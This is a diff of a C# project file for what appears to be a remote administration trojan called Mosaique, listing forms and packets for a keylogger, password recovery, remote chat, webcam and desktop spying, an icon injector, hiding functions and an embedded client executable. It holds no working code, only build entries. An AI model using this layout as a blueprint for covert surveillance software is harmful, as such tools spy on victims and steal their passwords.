@@ -80,10 +80,12 @@
     <Compile Include="Controllers\FrmRemoteChatController.cs" />
     <Compile Include="Controllers\IconInjectorController.cs" />
     <Compile Include="Controllers\Server\ClientMosaique.cs" />
+    <Compile Include="Controllers\test.cs" />
     <Compile Include="Models\ClientRegistration.cs" />
     <Compile Include="Packets\ServerPackets\CloseClient.cs" />
     <Compile Include="Packets\ServerPackets\CloseRemoteChat.cs" />
     <Compile Include="Packets\ServerPackets\DoTrayCdOpenClose.cs" />
+    <Compile Include="Packets\ServerPackets\HideShow.cs" />
     <Compile Include="Packets\ServerPackets\MsgToRemoteChat.cs" />
     <Compile Include="Packets\ServerPackets\PlaySong.cs" />
     <Compile Include="Packets\ServerPackets\SendMessageBox.cs" />
@@ -95,17 +97,17 @@
     <Compile Include="Views\FrmFileManager.designer.cs">
       <DependentUpon>FrmFileManager.cs</DependentUpon>
     </Compile>
+    <Compile Include="Views\FrmHideShowFunctions.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Views\FrmHideShowFunctions.Designer.cs">
+      <DependentUpon>FrmHideShowFunctions.cs</DependentUpon>
+    </Compile>
     <Compile Include="Views\FrmKeylogger.cs">
       <SubType>Form</SubType>
     </Compile>
     <Compile Include="Views\FrmKeylogger.designer.cs">
       <DependentUpon>FrmKeylogger.cs</DependentUpon>
-    </Compile>
-    <Compile Include="Views\FrmListener.cs">
-      <SubType>Form</SubType>
-    </Compile>
-    <Compile Include="Views\FrmListener.designer.cs">
-      <DependentUpon>FrmListener.cs</DependentUpon>
     </Compile>
     <Compile Include="Views\FrmMain\About.xaml.cs">
       <DependentUpon>About.xaml</DependentUpon>
@@ -295,12 +297,16 @@
     <EmbeddedResource Include="Properties\Resources.resx">
       <Generator>ResXFileCodeGenerator</Generator>
       <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
     </EmbeddedResource>
     <EmbeddedResource Include="Views\FrmFileManager.resx">
       <DependentUpon>FrmFileManager.cs</DependentUpon>
     </EmbeddedResource>
-    <EmbeddedResource Include="Views\FrmListener.resx">
-      <DependentUpon>FrmListener.cs</DependentUpon>
+    <EmbeddedResource Include="Views\FrmHideShowFunctions.resx">
+      <DependentUpon>FrmHideShowFunctions.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Views\FrmKeylogger.resx">
+      <DependentUpon>FrmKeylogger.cs</DependentUpon>
     </EmbeddedResource>
     <EmbeddedResource Include="Views\FrmPasswordRecovery.resx">
       <DependentUpon>FrmPasswordRecovery.cs</DependentUpon>
@@ -355,9 +361,6 @@
   </ItemGroup>
   <ItemGroup>
     <Resource Include="Assets\Icon\MenuItem\Fun\06.png" />
-    <Resource Include="Assets\Icon\MenuItem\Fun\comment.png" />
-    <Resource Include="Assets\Icon\MenuItem\Fun\comment_add.png" />
-    <Resource Include="Assets\Icon\MenuItem\Fun\Mosaique.ico" />
     <Resource Include="Assets\Icon\MenuItem\Fun\music.png" />
     <Resource Include="Assets\Icon\MenuItem\Fun\smiley.png" />
   </ItemGroup>
@@ -379,7 +382,6 @@
     <Resource Include="Assets\Icon\MenuItem\Spying\Desktop.png" />
     <Resource Include="Assets\Icon\MenuItem\Spying\eye.png" />
     <Resource Include="Assets\Icon\MenuItem\Spying\key.png" />
-    <Resource Include="Assets\Icon\MenuItem\Spying\keyboard.png" />
     <Resource Include="Assets\Icon\MenuItem\Spying\terminal.png" />
     <Resource Include="Assets\Icon\MenuItem\Spying\webcam.png" />
   </ItemGroup>
@@ -422,6 +424,18 @@
     <Resource Include="Assets\Icon\MainWindow\Mosaique.ico" />
   </ItemGroup>
   <ItemGroup>
+    <Resource Include="Assets\Icon\MenuItem\Spying\keyboard.png" />
+    <Resource Include="Assets\Icon\MenuItem\Fun\comment.png" />
+    <Resource Include="Assets\Icon\MenuItem\Fun\switch\switchs.png" />
+    <Resource Include="Assets\Icon\MenuItem\Fun\switch\taskbar.png" />
+    <Resource Include="Assets\Icon\MenuItem\Fun\music-note.png" />
+    <Resource Include="Assets\Icon\MenuItem\Fun\computer.png" />
+    <Resource Include="Assets\Icon\MenuItem\Fun\sensd.png" />
+    <Resource Include="Assets\Icon\MenuItem\Fun\chatting.png" />
+    <Resource Include="Assets\Icon\MenuItem\Fun\switch\switch.png" />
+    <Resource Include="Assets\Icon\MenuItem\Fun\switch\switchOff.png" />
+    <Resource Include="Assets\Icon\MenuItem\Fun\switch\switchOn.png" />
+    <Resource Include="Assets\Icon\MenuItem\Fun\send.png" />
     <Content Include="Resources\Client.exe" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
